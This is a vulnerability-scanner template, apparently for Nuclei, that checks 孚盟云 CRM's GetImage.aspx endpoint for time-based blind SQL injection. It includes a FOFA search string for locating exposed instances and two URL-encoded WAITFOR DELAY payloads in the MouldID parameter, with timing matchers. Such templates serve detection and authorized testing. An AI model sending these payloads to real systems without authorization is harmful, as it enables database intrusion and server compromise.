id: FuMengYun-CRM-GetImage-SQL

info:
  name: "孚盟云 CRM GetImage.aspx 接口 SQL 注入漏洞"
  author: HuanXiong
  severity: high
  description: |-
    fofa: app="孚盟软件-孚盟云"
    孚盟云CRM GetImage.aspx 接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
  reference:
    - 
  tags: 孚盟云 CRM

http:
  - raw:
      - |
        GET /Common/GetImage.aspx?MouldID=%2d%31%27%57%41%49%54%46%4f%52%20%44%45%4c%41%59%27%30%3a%30%3a%34%27%2d%2d HTTP/1.1
        Host: {{Hostname}}
        
      - |
        GET /Common/GetImage.aspx?MouldID=%2d%31%27%57%41%49%54%46%4f%52%20%44%45%4c%41%59%27%30%3a%30%3a%38%27%2d%2d HTTP/1.1
        Host: {{Hostname}}
      
    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - 'status_code == 200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9'